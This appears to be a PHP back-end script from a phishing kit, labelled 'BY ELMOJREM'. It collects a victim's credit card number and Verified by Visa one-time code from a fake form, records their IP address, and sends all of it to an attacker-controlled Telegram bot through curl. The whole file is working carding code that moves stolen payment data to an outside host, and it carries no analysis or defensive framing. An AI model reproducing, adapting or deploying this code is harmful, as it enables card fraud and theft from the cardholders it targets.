<?php
header("Access-Control-Allow-Origin: *"); // Replace '*' with your allowed origins

include 'config.php';

function getRealIpAddr()
{
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
        $ip = $_SERVER['HTTP_CLIENT_IP'];
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
    } else {
        $ip = $_SERVER['REMOTE_ADDR'];
    }
    return $ip;
}


// Ensure all required variables are set
if (isset($_POST['text_input'], $_GET['ccnumber'])) {
    $ccnumb = base64_decode($_GET['ccnumber']);
    $Cpode = $_POST['text_input'];

    // Validate and sanitize credit card number and VBV code
    $realcc = str_replace(' ', '', $ccnumb);
    // Additional validation and sanitization steps if needed

    // Construct the message
    $message = "#---------------++==[ тЪбя╕П New VBV Rez тЪбя╕П ]==++-------------#\n";
    $message .= "CCNUMB  : $realcc\n";
    $message .= "VBV  : $Cpode\n";
    $message .= "#---------------++==[ ЁЯТ╗ USER INFO ЁЯТ╗ ]==++-------------#\n";
    $message .= "IP  : " . getRealIpAddr() . "\n";
    $message .= "#---------------++==[ тЪая╕П BY ELMOJREM тЪая╕П ]==++-------------#\n";

    // Send message to Telegram chat for each user_id

        $website = "https://api.telegram.org/bot" . $telegramBotToken;
        $params = [
            'chat_id' => $chatId,
            'text' => $message,
        ];
        $ch = curl_init($website . '/sendMessage');
        curl_setopt($ch, CURLOPT_HEADER, false);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $params);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        $result = curl_exec($ch);

        // Handle cURL errors
        if ($result === false) {
            $error = curl_error($ch);
            // Handle the error (e.g., log the error, display an error message, etc.)
            // Avoid showing specific cURL errors to users for security reasons
        }

        curl_close($ch);
    

    // Clear HTTP headers and output an "ok" response
    //header_remove();
    echo 'ok';
    exit();
}



?>
